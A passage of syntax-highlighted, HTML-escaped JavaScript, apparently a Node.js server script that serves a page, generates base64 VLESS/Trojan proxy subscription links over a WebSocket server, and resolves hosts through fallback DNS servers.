  \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e key, cert \u003cspan class=\"o\"\u003e}\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003ekey \u003cspan class=\"o\"\u003e||\u003c/span\u003e cert\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    console.warn\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;Both TLS key and certificate are required; falling back to HTTP.\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e null\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003econst \u003cspan class=\"nv\"\u003erequestHandler\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003ereq, res\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003ereq.url \u003cspan class=\"o\"\u003e===\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;/\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    const \u003cspan class=\"nv\"\u003efilePath\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e path.join\u003cspan class=\"o\"\u003e(\u003c/span\u003e__dirname, \u003cspan class=\"s1\"\u003e\u0026#39;index.html\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    fs.readFile\u003cspan class=\"o\"\u003e(\u003c/span\u003efilePath, \u003cspan class=\"s1\"\u003e\u0026#39;utf8\u0026#39;\u003c/span\u003e, \u003cspan class=\"o\"\u003e(\u003c/span\u003eerr, content\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003eerr\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        res.writeHead\u003cspan class=\"o\"\u003e(\u003c/span\u003e200, \u003cspan class=\"o\"\u003e{\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Content-Type\u0026#39;\u003c/span\u003e: \u003cspan class=\"s1\"\u003e\u0026#39;text/html\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e})\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        res.end\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;Hello world!\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      res.writeHead\u003cspan class=\"o\"\u003e(\u003c/span\u003e200, \u003cspan class=\"o\"\u003e{\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Content-Type\u0026#39;\u003c/span\u003e: \u003cspan class=\"s1\"\u003e\u0026#39;text/html\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e})\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      res.end\u003cspan class=\"o\"\u003e(\u003c/span\u003econtent\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e})\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003ereq.url \u003cspan class=\"o\"\u003e===\u003c/span\u003e \u003cspan class=\"sb\"\u003e`\u003c/span\u003e/\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eSUB_PATH\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"sb\"\u003e`\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    const \u003cspan class=\"nv\"\u003enamePart\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e NAME ? \u003cspan class=\"sb\"\u003e`\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eNAME\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e-\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eISP\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"sb\"\u003e`\u003c/span\u003e : ISP\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    const \u003cspan class=\"nv\"\u003evlessURL\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"sb\"\u003e`\u003c/span\u003evless://\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eUUID\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e@\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eDOMAIN\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e:443?encryption\u003cspan class=\"o\"\u003e=\u003c/span\u003enone\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003esecurity\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003etls\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003esni\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eDOMAIN\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003efp\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003echrome\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003etype\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ews\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003ehost\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eDOMAIN\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003epath\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e%2F\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eWSPATH\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"c1\"\u003e#${namePart}`;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    const \u003cspan class=\"nv\"\u003etrojanURL\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"sb\"\u003e`\u003c/span\u003etrojan://\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eUUID\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e@\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eDOMAIN\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e:443?security\u003cspan class=\"o\"\u003e=\u003c/span\u003etls\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003esni\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eDOMAIN\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003efp\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003echrome\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003etype\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003ews\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003ehost\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eDOMAIN\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"p\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"nv\"\u003epath\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e%2F\u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003eWSPATH\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"c1\"\u003e#${namePart}`;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    const \u003cspan class=\"nv\"\u003esubscription\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e vlessURL + \u003cspan class=\"s1\"\u003e\u0026#39;\\n\u0026#39;\u003c/span\u003e + trojanURL\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    const \u003cspan class=\"nv\"\u003ebase64Content\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e Buffer.from\u003cspan class=\"o\"\u003e(\u003c/span\u003esubscription\u003cspan class=\"o\"\u003e)\u003c/span\u003e.toString\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;base64\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    res.writeHead\u003cspan class=\"o\"\u003e(\u003c/span\u003e200, \u003cspan class=\"o\"\u003e{\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Content-Type\u0026#39;\u003c/span\u003e: \u003cspan class=\"s1\"\u003e\u0026#39;text/plain\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e})\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    res.end\u003cspan class=\"o\"\u003e(\u003c/span\u003ebase64Content + \u003cspan class=\"s1\"\u003e\u0026#39;\\n\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e \u003cspan class=\"k\"\u003eelse\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    res.writeHead\u003cspan class=\"o\"\u003e(\u003c/span\u003e404, \u003cspan class=\"o\"\u003e{\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;Content-Type\u0026#39;\u003c/span\u003e: \u003cspan class=\"s1\"\u003e\u0026#39;text/plain\u0026#39;\u003c/span\u003e \u003cspan class=\"o\"\u003e})\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    res.end\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;Not Found\\n\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"o\"\u003e}\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003econst \u003cspan class=\"nv\"\u003etlsOptions\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e getTLSOptions\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003econst \u003cspan class=\"nv\"\u003ehttpServer\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e tlsOptions ? https.createServer\u003cspan class=\"o\"\u003e(\u003c/span\u003etlsOptions, requestHandler\u003cspan class=\"o\"\u003e)\u003c/span\u003e : http.createServer\u003cspan class=\"o\"\u003e(\u003c/span\u003erequestHandler\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003econst \u003cspan class=\"nv\"\u003ewss\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e new WebSocket.Server\u003cspan class=\"o\"\u003e({\u003c/span\u003e server: httpServer \u003cspan class=\"o\"\u003e})\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003econst \u003cspan class=\"nv\"\u003euuid\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e UUID.replace\u003cspan class=\"o\"\u003e(\u003c/span\u003e/-/g, \u003cspan class=\"s2\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003econst \u003cspan class=\"nv\"\u003eDNS_SERVERS\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"o\"\u003e[\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;114.114.114.114\u0026#39;\u003c/span\u003e, \u003cspan class=\"s1\"\u003e\u0026#39;223.5.5.5\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e// Custom DNS\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003easync \u003cspan class=\"k\"\u003efunction\u003c/span\u003e resolveHost\u003cspan class=\"o\"\u003e(\u003c/span\u003ehost\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  const \u003cspan class=\"nv\"\u003etarget\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e String\u003cspan class=\"o\"\u003e(\u003c/span\u003ehost \u003cspan class=\"o\"\u003e||\u003c/span\u003e \u003cspan class=\"s1\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e.trim\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003e!target\u003cspan class=\"o\"\u003e)\u003c/span\u003e throw new Error\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026#39;Host is empty\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003enet.isIP\u003cspan class=\"o\"\u003e(\u003c/span\u003etarget\u003cspan class=\"o\"\u003e))\u003c/span\u003e \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e target\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  try \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    const \u003cspan class=\"nv\"\u003eaddresses\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e await dns.promises.lookup\u003cspan class=\"o\"\u003e(\u003c/span\u003etarget, \u003cspan class=\"o\"\u003e{\u003c/span\u003e all: \u003cspan class=\"nb\"\u003etrue\u003c/span\u003e \u003cspan class=\"o\"\u003e})\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    const \u003cspan class=\"nv\"\u003epreferred\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e addresses.find\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"nv\"\u003ea\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e\u0026gt; a.family \u003cspan class=\"o\"\u003e===\u003c/span\u003e 4\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e||\u003c/span\u003e addresses\u003cspan class=\"o\"\u003e[\u003c/span\u003e0\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003epreferred?.address\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e preferred.address\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e catch \u003cspan class=\"o\"\u003e(\u003c/span\u003e_\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    // fall through to custom DNS servers\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  const \u003cspan class=\"nv\"\u003eresolver\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e new dns.promises.Resolver\u003cspan class=\"o\"\u003e()\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"k\"\u003efor\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003econst server of DNS_SERVERS\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    try \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      resolver.setServers\u003cspan class=\"o\"\u003e([\u003c/span\u003eserver\u003cspan class=\"o\"\u003e])\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      const \u003cspan class=\"nv\"\u003ev4\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e await resolver.resolve4\u003cspan class=\"o\"\u003e(\u003c/span\u003etarget\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003ev4?.\u003cspan class=\"o\"\u003e[\u003c/span\u003e0\u003cspan class=\"o\"\u003e])\u003c/span\u003e \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e v4\u003cspan class=\"o\"\u003e[\u003c/span\u003e0\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e catch \u003cspan class=\"o\"\u003e(\u003c/span\u003e_\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    try \u003cspan class=\"o\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      resolver.setServers\u003cspan class=\"o\"\u003e([\u003c/span\u003eserver\u003cspan class=\"o\"\u003e])\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      const \u003cspan class=\"nv\"\u003ev6\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e await resolver.resolve6\u003cspan class=\"o\"\u003e(\u003c/span\u003etarget\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e      \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"o\"\u003e(\u003c/span\u003ev6?.\u003cspan class=\"o\"\u003e[\u003c/span\u003e0\u003cspan class=\"o\"\u003e])\u003c/span\u003e \u003cspan class=\"k\"\u003ereturn\u003c/span\u003e v6\u003cspan class=\"o\"\u003e[\u003c/span\u003e0\u003cspan class=\"o\"\u003e]\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"o\"\u003e}\u003c/span\u003e catch \u003cspan class=\"o\"\u003e(\u003c/span\u003e_\u003cspan class=\"o\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e{}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"o\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  throw new Error\u003cspan class=\"o\"\u003e(\u003c/span\u003e\u003cspan class=\"sb\"\u003e`\u003c/span\u003eFailed to resolve \u003cspan class=\"si\"\u003e${\u003c/span\u003e\u003cspan class=\"nv\"\u003etarget\u003c/span\u003e\u003cspan class=\"si\"\u003e}\u003c/span\u003e\u003cspan class=\"sb\"\u003e`\u003c/span\u003e\u003cspan class=\"o\"\u003e)\u003c/span\u003e\u003cspan 